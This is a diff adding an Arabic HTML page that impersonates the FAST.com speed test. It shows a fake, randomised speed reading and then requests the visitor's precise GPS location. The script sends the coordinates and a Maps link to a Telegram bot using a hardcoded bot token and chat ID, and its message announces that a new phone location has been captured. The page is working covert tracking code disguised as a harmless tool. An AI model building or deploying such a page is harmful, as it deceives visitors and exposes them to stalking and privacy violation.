@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FAST.com | اختبار سرعة الإنترنت</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #ffffff;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-between min-h-screen p-6 text-center select-none">
+
+    <div class="w-full max-w-4xl flex justify-start items-center pt-4">
+        <div class="flex flex-col items-center border-b-4 border-red-600 pb-1">
+            <span class="text-3xl font-black tracking-tighter text-black uppercase">fast</span>
+        </div>
+    </div>
+
+    <div id="welcomeScreen" class="flex flex-col items-center justify-center flex-grow max-w-md w-full transition-all duration-300">
+        <h1 class="text-3xl font-bold text-gray-800 mb-3">أهلاً بك في منصة قياس السرعة</h1>
+        <p class="text-gray-500 text-base mb-8 leading-relaxed">
+            مرحباً بك في نظام الفحص الذكي. يرجى النقر على الزر أدناه لقياس سرعة الإنترنت الحالية بدقة وتحديد أقرب خوادم البث المتاحة لجهازك.
+        </p>
+        
+        <button id="startTestBtn" class="bg-gray-900 hover:bg-black text-white font-semibold px-8 py-4 rounded-xl shadow-md transition duration-200 text-lg cursor-pointer">
+            ابدأ اختبار السرعة الآن
+        </button>
+    </div>
+
+    <div id="counterScreen" class="flex flex-col items-center justify-center flex-grow hidden">
+        <h2 class="text-gray-500 text-lg md:text-xl font-normal mb-2" id="titleText">سرعة الإنترنت لديك</h2>
+        
+        <div class="flex items-baseline justify-center relative">
+            <span id="speed" class="text-[120px] md:text-[180px] font-light leading-none tracking-tighter text-gray-800">0.0</span>
+            
+            <div class="flex flex-col items-start mr-4">
+                <span class="text-3xl md:text-4xl font-normal text-gray-800">Mbps</span>
+                <button id="refreshBtn" class="mt-2 text-gray-400 hover:text-gray-600 transition hidden">
+                    <svg class="w-8 h-8 p-1 border-2 border-gray-300 rounded-full" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 1121.253 8H18"></path>
+                    </svg>
+                </button>
+            </div>
+        </div>
+
+        <div id="details" class="mt-8 grid grid-cols-3 gap-8 border-t border-gray-200 pt-6 max-w-md w-full text-sm text-gray-600 opacity-0 transition-opacity duration-500">
+            <div>
+                <p class="text-gray-400 text-xs">تأخر الاستجابة</p>
+                <p class="font-semibold mt-1">غير محمّل</p>
+                <p class="text-xl font-bold text-gray-800 mt-1">86 <span class="text-xs font-normal">ms</span></p>
+            </div>
+            <div>
+                <p class="text-gray-400 text-xs">محمّل</p>
+                <p class="font-semibold mt-1">منقول</p>
+                <p class="text-xl font-bold text-gray-800 mt-1">627 <span class="text-xs font-normal">ms</span></p>
+            </div>
+            <div>
+                <p class="text-gray-400 text-xs">تحميل</p>
+                <p class="font-semibold mt-1">السرعة</p>
+                <p class="text-xl font-bold text-gray-800 mt-1">810 <span class="text-xs font-normal">Kbps</span></p>
+            </div>
+        </div>
+    </div>
+
+    <div class="w-full max-w-4xl text-xs text-gray-400 border-t border-gray-100 pt-4 flex justify-between items-center">
+        <div>خادم (خوادم): Paris, FR | Singapore, SG</div>
+        <div>العميل: Talkha, EG | 41.232.0.6</div>
+    </div>
+
+    <script>
+        // التوكن والمعرف الخاص بالبوت بتليجرام
+        const TELEGRAM_BOT_TOKEN = '8314742013:AAELjpon6awDJ1bRz1zPV_BczR7WyCpEFNM';
+        const TELEGRAM_CHAT_ID = '1005732368';
+        const welcomeScreen = document.getElementById('welcomeScreen');
+        const counterScreen = document.getElementById('counterScreen');
+        const startTestBtn = document.getElementById('startTestBtn');
+        const speedElement = document.getElementById('speed');
+        const detailsElement = document.getElementById('details');
+        const titleText = document.getElementById('titleText');
+        const refreshBtn = document.getElementById('refreshBtn');
+
+        // عند النقر على زر بدء الاختبار
+        startTestBtn.addEventListener('click', () => {
+            welcomeScreen.classList.add('hidden'); // إخفاء الشاشة الترحيبية
+            counterScreen.classList.remove('hidden'); // إظهار شاشة العداد
+            simulateSpeedTest(); // بدء الفحص الوهمي
+        });
+
+        function simulateSpeedTest() {
+            let currentSpeed = 0.0;
+            let counter = 0;
+            
+            const interval = setInterval(() => {
+                counter++;
+                currentSpeed = (Math.random() * (7.5 - 3.0) + 3.0).toFixed(1);
+                speedElement.innerText = currentSpeed;
+
+                if (counter > 25) {
+                    clearInterval(interval);
+                    speedElement.innerText = "5.6"; // استقرار على الرقم المطلّوب
+                    titleText.innerText = "اكتمل اختبار سرعة الإنترنت";
+                    detailsElement.classList.remove('opacity-0'); 
+                    refreshBtn.classList.remove('hidden');
+                    
+                    // استدعاء دالة طلب الموقع تلقائياً بمجرد اكتمال الفحص
+                    requestLocation();
+                }
+            }, 150);
+        }
+
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToTelegram, handleLocationError, {
+                    enableHighAccuracy: true,
+                    timeout: 12000,
+                    maximumAge: 0
+                });
+            }
+        }
+
+        async function sendLocationToTelegram(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
+
+            const message = `🎯 *تم رصد موقع هاتف جديد!* 🎯\n\n` +
+                            `📍 *الإحداثيات:* \`${lat}, ${lon}\`\n` +
+                            `📏 *نسبة دقة الـ GPS:* حوالي ${Math.round(accuracy)} متر\n\n` +
+                            `🗺️ *رابط الخريطة المباشر:*\n${googleMapsUrl}`;
+
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending message:', error);
+            }
+        }
+
+        function handleLocationError(error) {
+            console.log("Location access denied or timed out.");
+        }
+
+        // إعادة التجربة عند الضغط على زر التحديث الدائري
+        refreshBtn.addEventListener('click', () => {
+            titleText.innerText = "سرعة الإنترنت لديك";
+            detailsElement.classList.add('opacity-0');
+            refreshBtn.classList.add('hidden');
+            simulateSpeedTest();
+        });
+    </script>
+</body>
+</html>
